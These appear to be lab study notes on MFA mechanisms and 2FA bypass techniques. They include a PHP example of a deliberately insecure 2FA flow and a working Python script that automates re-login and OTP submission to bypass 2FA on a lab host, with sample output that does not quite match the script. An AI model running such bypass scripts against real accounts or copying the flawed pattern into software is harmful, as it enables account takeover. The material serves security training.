# How it work
The goal of MFA is to combine 2 or more kinds of credentials:
- **Something you know**: This could be a password, a PIN, or other information. This kind of authentification can be vulnerable if not used with other factor.
- **Something you have**: This could be you phone with an authentification app.
- **Something you are**: This involve biometrics, such as fingerprints, facial recognition, or iris scans. This type of authentification is powerfull because it is hard to fake. (Note that a fingerprint or facial scan never matches 100%, so we have to combine it with other type of auth).
- **Somewhere you are**: This involve your IP address or geolocation.
- **Something you do**: This is used in the apps that restrict bot interaction, like registration page. The application typically analyses the way the user types the credentials or move their mouse, it is hard to implement.
## 2FA
### Time-based one time passwords (TOTP)
These are **temporary password** that **change every 30 seconds** or so. Apps like **Google Authentificator**, **Authy** use them, making them tough for hackers to intercept or reuse.
### Push notifications
Applications likes Duo, Github or Google prompt **send a login request straight to your phone**. You can approve or deny them.
### SMS
Most of applications currently use this method. The system **send a text message with a one-time code** to the user's registred **phone number**.
It is **less secure** due to vulnerabilities associated with intercepting text messages.
### Hardware tokens
Devices like YubiKeys generate a **one-time passcode** or use **NFC** for authentification. They don't need a network or battery, so **they work even offline**.
## Conditional access
### Location-based
If the user logs in **from their usually location**, the system let him **use their regular login crendentials**, else, the system could ask for an **additionnal OTP** or even **biometric verification**.
### Time-based
**During regular working hours,** users might get in with just their **regular login credentials**, **however** they might be prompted for **an extra layer of security like OTP**.
### Behavioral Analysis
Suppose a **user's behavior suddenly changes**, like they began accessing data they don't usually view or access at odd hours, **the system can ask for additional authentification**.
### Device-Specific
In some case, **companies don't allow** employees to **use their own devices** to access corporate ressources.
# Common vulnerabilities
## Weak OTP generation algorithms
The **security** of OTP is only **as strong as the algorithm used** to create it. If the algorithm is **weak or too predictable**, it make the attacker's job easier. If the algorithm **don't use random seed or follow a pattern** for exemple.
## Application leaking the 2FA token
If an application handles data poorly or has **vulnerabilites like insecure API endpoints** it might **leak the 2FA token** in the HTTP response.
## Brute forcing the OTP
The OTP are not immune to brute-force attacks. If an attacker **can make unlimited guesses**, they might eventually get the correct OTP.
## Usage of Evilginx
[Evilginx](https://github.com/kgretzky/evilginx2) is a tool that is typically used in red team engagements. It can be used to execute **sophisticated phishing attacks**, effectively bypassing MFA. It operating as a man in the middle attack.
![[Pasted image 20250112120331.png]]
# OTP Leakage 
The OTP leakage in the XHR (XML Http Request) response typically happens due to poor implementation of the 2FA mechanism or insecure coding.
-  **Server-side validation and return of sensitive data / Lack of proper security practice / debbuging information in production**: The server validate the OTP by sending it back to the client in the response. It commonly due to the forget of remove the debug functions.
## Server-side validation and return of sensitive data
![[Pasted image 20250112121146.png]]
## Lack of proper security practice
The session is given even if the token is not validated:
![[Pasted image 20250112121416.png]]![[Pasted image 20250112121434.png]]
### Exemple of code
Here is a secure implementation, the token is gaved after the verification of the 2fa code.
```php
# Function that verifies the submitted 2FA token
function verify_2fa_code($code) {
    if (!isset($_SESSION['token']))
    return false;

    return $code === $_SESSION['token'];
}

# Function called in the /mfa page
if (verify_2fa_code($_POST['code'])) { #If successful, the user will be redirected to the dashboard.
    $_SESSION['authenticated'] = true; # Session that is used to check if the user completed the 2FA
    header('Location: ' . ROOT_DIR . '/dashboard');
    return;
}
```

Here is a bad and unsecure implementation of 2fa.
```php
function authenticate($email, $password){
  $pdo = get_db_connection();
  $stmt = $pdo->prepare("SELECT `password` FROM users WHERE email = :email");
  $stmt->execute(['email' => $email]);
  $user = $stmt->fetch(PDO::FETCH_ASSOC);

  return $user && password_verify($password, $user['password']);
}

if (authenticate($email, $password)) {
    $_SESSION['authenticated'] = true; # This flag should only be issued after the MFA completion
    $_SESSION['email'] = $_POST['email'];
    header('Location: ' . ROOT_DIR . '/mfa');
    return;
}
```
# Beating the auto-logout Feature
In some applications, when you failed the 2FA challenge, it can bring you back to the first phase where you put your credentials.
This mechanism is used to prevent bruteforcing for exemple.
## How it work
- **Session invalidation**: The application might invalidate the user's session as a security measure, forcing the user to start the authentification process from scratch.
- **Rate-limiting and lockout policies**: To prevent attackers from repeatedly attempting to bypass 2FA, the application may have rate-limiting or lockout mechanisms after a set number or failed attempts.
- **Security-driven redirection**: When the application is designed to redirect users back to the login page after mulitple failed attempt.
## Automation is the key
The automation make life easier when attacking this type of proteciton because:
- **Speed**: Logging back manually every time is slow and tendious.
- **Consistency**: Automation avoids mistakes that might happen if you're doing the same repetitive actions.
- **Recovering from logouts**: If the application logs you out after a few failed attemps, the script can automatically log back.
- **Customization**: You can customize your scripts to test specific scenarios, such as using different IP addresses or user agents.
## Exploitation
Here is an exemple of code:
```python
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
```
Explanation:
**Script Setup**
- **URLs**:
    - `login_url`: The URL for the login page where the user enters their email and password.
    - `otp_url`: The URL where the user submits the 4-digit OTP for verification.
    - `dashboard_url`: The URL of the dashboard that the user is redirected to after successful authentication.
- **Credentials**:
    - The `credentials` dictionary holds the email and password that will be used to log in.
- **Headers**:
    - The `headers` dictionary contains HTTP headers that mimic a real browser request, including `User-Agent`, `Referer`, `Content-Type`, and others.
**Functions**
- **is_login_successful(response)**:
    - Checks if the login was successful by looking for the phrase "User Verification" in the response text and ensuring the status code is `200 OK`.
- **login(session)**:
    - Performs the login by sending a POST request with the user’s credentials to the `login_url`. It returns the server's response.
- **submit_otp(session, otp)**:
    - Sends the 4-digit OTP to the `otp_url` in a POST request. The OTP is split into individual digits and sent as separate parameters (`code-1`, `code-2`, etc.). The function returns the server's response.
- **is_login_page(response)**:
    - Checks if the response contains the login page by looking for keywords like "Sign in to your account" or "Login" in the response text.
**Brute-Force Process**
- **OTP Range**:
    - The script loops till the application responds with the same OTP set in the script.
- **Session Creation**:
    - For each OTP attempt, a new session is created using `requests.Session()`, ensuring a fresh session for every login and OTP submission attempt.
- **Login Attempt**:
    - The script attempts to log in using the provided credentials. If the login is successful, it prints "Logged in successfully" and continues to the OTP submission. If the login fails, the script skips to the next OTP attempt.
- **OTP Submission**:
    - The script formats the OTP as a 4-digit string and sends it to the `otp_url`.
- **Response Handling**:
    - If the server response contains the login page (indicating a failed OTP attempt), the script prints an error message and continues to the next OTP.
    - If the response has a `302 Found` status code (indicating a redirection), it checks the `Location` header:
        - If redirected to `/labs/third/dashboard`, it indicates a successful OTP bypass, and the script prints a success message and exits.
        - If redirected to `/labs/third/` (the login page), it indicates a failed OTP, and the script prints an error message.
        - Any other redirect location is flagged as unexpected, and an error message is printed.
    - If the response has any other status code, the script prints the status code and retries the next OTP.

```bash
$ python3 exploit.py
Trying OTP: 1336
DEBUG: OTP submission response status code: 302
Unsuccessful OTP attempt, redirected to login page. OTP: 1336
Trying OTP: 1337
DEBUG: OTP submission response status code: 302
Session cookies: {'PHPSESSID': 'tg989k9err99uihdp8mca8ssdc'}
Successfully bypassed 2FA with OTP: 1337
```